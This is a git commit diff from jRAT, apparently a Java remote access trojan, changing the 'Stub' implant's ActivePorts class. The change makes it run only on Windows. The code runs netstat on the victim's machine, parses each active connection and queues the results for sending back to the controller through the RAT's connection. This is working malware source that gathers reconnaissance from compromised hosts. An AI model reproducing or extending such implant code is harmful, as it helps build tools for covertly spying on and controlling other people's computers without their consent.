95c313e69cd1610640451702d93411d169009292
redpois0n <red@cmail.nu>
2014-04-19 13:10:36 +0200

    ActivePorts only on windows

--- Stub/src/io/jrat/stub/ActivePorts.java
+++ Stub/src/io/jrat/stub/ActivePorts.java
@@ -1,5 +1,6 @@
 package io.jrat.stub;
 
+import io.jrat.common.OperatingSystem;
 import io.jrat.stub.packets.outgoing.Packet51ActivePort;
 
 import java.io.BufferedReader;
@@ -9,26 +10,28 @@ import java.io.InputStreamReader;
 public class ActivePorts extends Thread {
 
 	public void run() {
-		try {
-			Process p = Runtime.getRuntime().exec("netstat");
-			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-			reader.readLine();
-			reader.readLine();
-			reader.readLine();
-			reader.readLine();
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			try {
+				Process p = Runtime.getRuntime().exec("netstat");
+				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+				reader.readLine();
+				reader.readLine();
+				reader.readLine();
+				reader.readLine();
 
-			String line;
+				String line;
 
-			while ((line = reader.readLine()) != null) {
-				line = line.trim().replaceAll(" +", " ");
+				while ((line = reader.readLine()) != null) {
+					line = line.trim().replaceAll(" +", " ");
 
-				String[] args = line.split(" ");
+					String[] args = line.split(" ");
 
-				Connection.addToSendQueue(new Packet51ActivePort(args[0], args[1], args[2], args[3]));
+					Connection.addToSendQueue(new Packet51ActivePort(args[0], args[1], args[2], args[3]));
+				}
+				reader.close();
+			} catch (Exception ex) {
+				ex.printStackTrace();
 			}
-			reader.close();
-		} catch (Exception ex) {
-			ex.printStackTrace();
 		}
 	}
 
